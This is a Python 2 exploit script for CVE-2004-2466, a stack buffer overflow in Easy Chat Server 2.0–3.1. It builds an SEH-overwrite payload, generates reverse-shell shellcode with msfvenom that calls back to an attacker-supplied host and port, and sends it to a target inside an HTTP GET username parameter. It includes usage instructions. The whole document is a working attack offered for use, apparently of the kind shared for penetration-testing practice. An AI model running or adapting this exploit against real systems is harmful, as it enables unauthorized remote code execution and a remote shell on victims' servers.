#!/usr/bin/python
# Easy Chat Server v2.0 to v3.1 Remote Stack Buffer Overflow
# Author: H4rk3nz0 based on community scripts
# CVE: CVE-2004-2466
# Installer: http://www.echatserver.com/

import sys, socket, time, os

# This exploit relies on file path length, please try all junk values

junk = "A" * 216           # ("C:\Program Files\Easy Chat Server\Users\")
# junk = "A" * 217         # ("C:\EFS Software\Easy Chat Server\Users\")
# junk = "A" * 210	   # ("C:\Program Files (x86)\Easy Chat Server\Users\")
nseh = "\xeb\x06\x90\x90"
seh = "\xb6\xb2\x01\x10"   # https://www.exploit-db.com/exploits/16772 # Metasploit Module
# seh = "\xa2\xb9\x01\x10" # https://www.exploit-db.com/exploits/11210 # Metasploit Module
# seh = "\xAC\x1F\x01\x10" # Craig Underhill Writeup
# seh = "\xbc\x04\x01\x10" # Aitezaz Mohsin's script
# seh = "\x86\xae\x01\x10" # r00tpgp's script
nops = "\x90" * 16

# Fixed encoder to only use alpha-numeric encoder as file path input is part of overflow and certain special/punctuation characters are forbidden in file and folder names
def main():
	print("[+] GENERATING SHELLCODE")
	shellcode =  os.system("""msfvenom -p windows/shell_reverse_tcp LHOST=""" + lhost + """ LPORT=""" + lport + """ -e x86/alpha_upper -f python -b """ + r"""'\x00\x01\x02\x0a\x0b\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c' -o shellcode.txt""")
	print("\n[+] TIDYING SHELLCODE")
	r = open("shellcode.txt", "r")
	buf = r.read()
	buf = buf.replace("buf += b\"", "")
	buf = buf.replace("buf =  b\"\"", "")
	buf = buf.replace("\n", "")
	buf = buf.replace("\"", "")
	buf = buf.replace("\\x", "")
	buf = buf.decode("hex")
	r.close()
	print("[+] MAKING A STATEMENT")
	request = junk + nseh + seh + nops + buf
	os.system("rm shellcode.txt")
	header = (
        "GET /chat.ghp?username=" + request + "&password=&room=1&sex=1 HTTP/1.1\r\n"
        "User-Agent: Mozilla/4.0\r\n"
        "Host: " + host +":" + str_port +"\r\n"
        "Accept-Language: en-us\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Referer: http://" + host + ":" + str_port + "\r\n"
        "Connection: Keep-Alive\r\n\r\n"
        )
	print("[+] SENDING CHAT A POG EMOJI")
	try:
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((host, port))
		client.send(header)
		client.close()
		print("[?] Check listener on port " + lport)
		print("[!] Exploit relies on file path length, try changing junk length")
	except:
		print("[-] An Error occurred when connecting to target port, is target app running?\n")

try:
	host = sys.argv[1]
	port = int(sys.argv[2])
	str_port = str(port)
	lhost = sys.argv[3]
	lport = str(sys.argv[4])
except:
	print("[!] USAGE EXAMPLE: python2 " + sys.argv[0] + " <target-ip> <target-port> <local-ip> <local-port>")
	exit()

if __name__=="__main__":
	main()

